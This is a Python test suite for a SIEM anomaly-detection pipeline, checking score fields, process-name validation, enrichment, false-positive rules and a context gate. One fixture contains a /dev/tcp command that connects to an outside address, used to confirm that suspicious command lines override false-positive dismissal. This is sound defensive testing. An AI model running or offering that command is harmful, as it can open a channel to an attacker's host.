"""
Regression tests for the SIEM loop remediation.

Each test ties directly back to a step in
`siem_loop_remediation_9a6e2de3.plan.md` and asserts the behaviour
we intended to change, not a toy approximation of it.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest

# Make project root importable when run via `pytest tests/`
_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))


# ---------------------------------------------------------------------------
# Step 1 - Score contract
# ---------------------------------------------------------------------------


class TestScoreContract:
    """Verify that `_build_es_doc` emits the new canonical score fields."""

    def test_build_es_doc_emits_raw_ml_score(self) -> None:
        from push_all_anomalies import _build_es_doc

        doc = _build_es_doc(
            "v3_rare_process_by_host_linux",
            {
                "ml_score": 0.83,
                "entity": {"host": "apkit", "process": "bash", "user": "root"},
                "timestamp": "2026-04-20T10:00:00Z",
                "event_count": 3,
            },
        )
        assert doc["raw_ml_score"] == pytest.approx(0.83)
        assert doc["record_score"] == pytest.approx(83.0)
        assert doc["score_contract_version"] == 2
        # Back-compat aliases preserved.
        assert doc["ml_score"] == pytest.approx(0.83)
        assert doc["score"] == pytest.approx(0.83)

    def test_build_es_doc_clamps_out_of_range(self) -> None:
        from push_all_anomalies import _build_es_doc

        doc = _build_es_doc(
            "v3_linux_anomalous_host_activity",
            {
                "ml_score": 1.5,  # corrupted upstream
                "entity": {"host": "h1"},
                "timestamp": "2026-04-20T10:00:00Z",
            },
        )
        assert 0.0 <= doc["raw_ml_score"] <= 1.0
        assert doc["record_score"] <= 100.0

    def test_normalize_max_rate_handles_fraction_and_percent(self) -> None:
        from detection_methods import _normalize_max_rate

        assert _normalize_max_rate(0.15) == pytest.approx(0.15)
        assert _normalize_max_rate(15.0) == pytest.approx(0.15)
        assert _normalize_max_rate(0.0) >= 0.001  # clamped
        assert _normalize_max_rate(200.0) <= 0.5  # clamped

    def test_safety_limit_uses_fraction_not_percentage(self) -> None:
        """The historical `raw / 100` bug turned 0.15 into 0.0015.

        We assert that with `max_anomaly_rate=0.15` and 100 rows where
        half are flagged anomalous, the result is capped at 15% (not
        0.15%).
        """
        import numpy as np
        import pandas as pd
        from detection_methods import _apply_safety_limits

        n = 100
        df = pd.DataFrame(
            {
                "is_ml_anomaly": [True] * 50 + [False] * 50,
                "ml_anomaly_score": np.linspace(0.01, 0.99, n),
            }
        )
        out = _apply_safety_limits(df, {"detection": {"max_anomaly_rate": 0.15}})
        assert out["is_ml_anomaly"].sum() == pytest.approx(15, abs=1)


# ---------------------------------------------------------------------------
# Step 2 - Entity / process extraction
# ---------------------------------------------------------------------------


class TestEntityRepair:
    """Malformed process tokens must be rejected or replaced."""

    def test_validator_rejects_digits_and_one_char(self) -> None:
        from push_all_anomalies import _is_valid_process_name

        assert _is_valid_process_name("bash") is True
        assert _is_valid_process_name("byobu-status") is True
        assert _is_valid_process_name("6") is False
        assert _is_valid_process_name("123") is False
        assert _is_valid_process_name("a") is False
        assert _is_valid_process_name("") is False
        assert _is_valid_process_name(None) is False

    def test_build_es_doc_replaces_numeric_process_token(self) -> None:
        from push_all_anomalies import _build_es_doc

        doc = _build_es_doc(
            "v3_rare_process_by_host_linux",
            {
                "ml_score": 0.9,
                "entity": {"host": "apkit", "process": "6"},
                "timestamp": "2026-04-20T10:00:00Z",
            },
        )
        assert doc["process.name"] == "invalid-process"
        assert doc["process_name_original"] == "6"


# ---------------------------------------------------------------------------
# Step 3 - Source enrichment
# ---------------------------------------------------------------------------


class TestEnrichmentCoverage:
    """File-event enrichment must fill `file.name` when raw events exist."""

    def test_enrichment_map_contains_file_events(self) -> None:
        from push_all_anomalies import _ENRICHMENT_SOURCE_MAP

        for dtype in ("process", "discovery", "network", "auth", "host"):
            sources = _ENRICHMENT_SOURCE_MAP[dtype]
            assert any(
                ".ds-logs-endpoint.events.file-default-*" in cfg["indices"]
                and "file.name" in cfg["provides"]
                for cfg in sources
            ), f"file enrichment missing for dtype={dtype}"

    def test_apply_source_enrichment_fills_file_name(self) -> None:
        from push_all_anomalies import _apply_source_enrichment

        doc: dict = {
            "host.name": "apkit",
            "process.name": "dockerd",
        }
        hit = {
            "host": {"name": "apkit"},
            "process": {"name": "dockerd"},
            "file": {"name": "log.txt", "path": "/var/log/log.txt"},
        }
        enriched = _apply_source_enrichment(
            doc, hit, ["file.name", "file.path"]
        )
        assert enriched >= 2
        assert doc["file.name"] == "log.txt"
        assert doc["file.path"] == "/var/log/log.txt"

    def test_apply_source_enrichment_rejects_cross_host(self) -> None:
        from push_all_anomalies import _apply_source_enrichment

        doc: dict = {"host.name": "apkit"}
        hit = {"host": {"name": "other-host"}, "user": {"name": "root"}}
        assert _apply_source_enrichment(doc, hit, ["user.name"]) == 0
        assert "user.name" not in doc


# ---------------------------------------------------------------------------
# Step 4 - FP classifier
# ---------------------------------------------------------------------------


class TestFalsePositiveClassifier:
    """Job-aware FP rules must fire while LOLBin protection stays intact."""

    @pytest.fixture(autouse=True)
    def _tmp_trace(self, tmp_path, monkeypatch) -> None:
        """Redirect the JSONL trace log into a tmp path so tests do not
        accumulate real-state artefacts."""
        import push_all_anomalies as push_mod

        monkeypatch.setattr(
            push_mod, "FP_TRACE_LOG", tmp_path / "fp_trace.jsonl"
        )
        monkeypatch.setattr(
            push_mod,
            "CONTEXT_QUARANTINE_LOG",
            tmp_path / "quarantine.jsonl",
        )

    def test_admin_discovery_cli_on_infra_host_is_fp(self) -> None:
        from push_all_anomalies import is_likely_false_positive

        doc = {
            "job_id": "v3_rare_process_by_host_linux",
            "host.name": "oc-ubuntu-server",
            "user.name": "administrator",
            "process.name": "ip",
            "process.command_line": "ip a",
        }
        is_fp, reason = is_likely_false_positive(doc)
        assert is_fp is True
        assert "admin_discovery_cli" in reason

    def test_numeric_process_name_is_fp(self) -> None:
        from push_all_anomalies import is_likely_false_positive

        doc = {
            "job_id": "v3_linux_anomalous_process_all_hosts",
            "host.name": "whatever",
            "process.name": "6",
        }
        is_fp, reason = is_likely_false_positive(doc)
        assert is_fp is True
        assert "tokenization_artifact" in reason

    def test_lolbin_on_infra_host_is_not_fp(self) -> None:
        """Even on a known infra host, bash/curl/python3 must stay eligible."""
        from push_all_anomalies import is_likely_false_positive

        for proc in ("bash", "sh", "sudo", "curl", "python3"):
            doc = {
                "job_id": "v3_rare_process_by_host_linux",
                "host.name": "oc-ubuntu-server",
                "user.name": "root",
                "process.name": proc,
                "process.command_line": f"{proc} --regular-use",
            }
            is_fp, reason = is_likely_false_positive(doc)
            assert is_fp is False, f"{proc}: must not be auto-FP, reason={reason!r}"

    def test_suspicious_cmdline_overrides_everything(self) -> None:
        from push_all_anomalies import is_likely_false_positive

        doc = {
            "job_id": "v3_rare_process_by_host_linux",
            "host.name": "oc-ubuntu-server",
            "user.name": "administrator",
            "process.name": "ip",
            # Contains /dev/tcp/ -> suspicious override
            "process.command_line": "bash -c 'cat /dev/tcp/1.2.3.4/4444'",
        }
        is_fp, _ = is_likely_false_positive(doc)
        assert is_fp is False

    def test_classify_fp_batch_writes_trace(self, tmp_path) -> None:
        import push_all_anomalies as push_mod

        docs = [
            {
                "anomaly_id": "a1",
                "job_id": "v3_rare_process_by_host_linux",
                "host.name": "oc-ubuntu-server",
                "user.name": "administrator",
                "process.name": "ip",
            },
            {
                "anomaly_id": "a2",
                "job_id": "v3_rare_process_by_host_linux",
                "host.name": "oc-ubuntu-server",
                "user.name": "root",
                "process.name": "bash",
                "process.command_line": "bash",
            },
        ]
        tp, fp, n = push_mod.classify_fp_batch(docs)
        assert n == 1
        assert len(tp) == 1
        assert push_mod.FP_TRACE_LOG.exists()
        lines = push_mod.FP_TRACE_LOG.read_text().splitlines()
        assert len(lines) == 2


# ---------------------------------------------------------------------------
# Step 5 - Context gate
# ---------------------------------------------------------------------------


class TestContextGate:
    """Minimum per-job context must be enforced with quarantine behaviour."""

    @pytest.fixture(autouse=True)
    def _tmp_quarantine(self, tmp_path, monkeypatch) -> None:
        import push_all_anomalies as push_mod

        monkeypatch.setattr(
            push_mod,
            "CONTEXT_QUARANTINE_LOG",
            tmp_path / "quarantine.jsonl",
        )

    def test_process_job_missing_host_is_quarantined(self) -> None:
        from push_all_anomalies import apply_context_gate

        docs = [
            {"job_id": "v3_rare_process_by_host_linux", "process.name": "bash"},
        ]
        kept, quarantined, counters = apply_context_gate(docs)
        assert len(kept) == 0
        assert len(quarantined) == 1
        assert any("missing_host_name" in k for k in counters)

    def test_network_job_needs_any_ip(self) -> None:
        from push_all_anomalies import apply_context_gate

        docs = [
            {
                "job_id": "v3_linux_anomalous_network_activity",
                "host.name": "h1",
                # No IPs at all
            },
            {
                "job_id": "v3_linux_anomalous_network_activity",
                "host.name": "h1",
                "destination.ip": "10.0.0.5",
            },
        ]
        kept, quarantined, _ = apply_context_gate(docs)
        assert len(kept) == 1
        assert len(quarantined) == 1

    def test_process_job_needs_user_or_cmdline(self) -> None:
        """For generic process jobs the gate requires host + process name
        plus at least one of user.name or process.command_line. The
        discovery / rare-process jobs have a looser gate on purpose
        because those are triaged by rarity, not by user context."""
        from push_all_anomalies import apply_context_gate

        docs = [
            {
                # Unrecognised process-class job -> falls into "process"
                "job_id": "v3_custom_process_activity",
                "host.name": "h1",
                "host.ip": "10.0.0.1",
                "process.name": "bash",
                # user.name and command_line missing
            },
            {
                "job_id": "v3_custom_process_activity",
                "host.name": "h1",
                "host.ip": "10.0.0.1",
                "process.name": "bash",
                "user.name": "root",
            },
        ]
        kept, quarantined, _ = apply_context_gate(docs)
        assert len(kept) == 1
        assert len(quarantined) == 1

    def test_process_job_needs_host_ip(self) -> None:
        """Process- and discovery-class alerts must carry the endpoint IP
        (host.ip). A record we cannot tie to a host IP is treated as
        synthetic/stale and quarantined, even when every other field is
        present. host.ip is normally back-filled by enrichment."""
        from push_all_anomalies import apply_context_gate

        docs = [
            {
                # Fully populated except host.ip -> quarantined
                "job_id": "v3_custom_process_activity",
                "host.name": "h1",
                "process.name": "bash",
                "user.name": "root",
            },
            {
                "job_id": "v3_custom_process_activity",
                "host.name": "h1",
                "host.ip": "10.0.0.1",
                "process.name": "bash",
                "user.name": "root",
            },
        ]
        kept, quarantined, counters = apply_context_gate(docs)
        assert len(kept) == 1
        assert len(quarantined) == 1
        assert any("missing_host_ip" in k for k in counters)

    def test_invalid_process_token_fails_gate(self) -> None:
        from push_all_anomalies import apply_context_gate

        docs = [
            {
                "job_id": "v3_rare_process_by_host_linux",
                "host.name": "h1",
                "process.name": "6",
                "user.name": "root",
            }
        ]
        kept, quarantined, _ = apply_context_gate(docs)
        assert len(kept) == 0
        assert len(quarantined) == 1
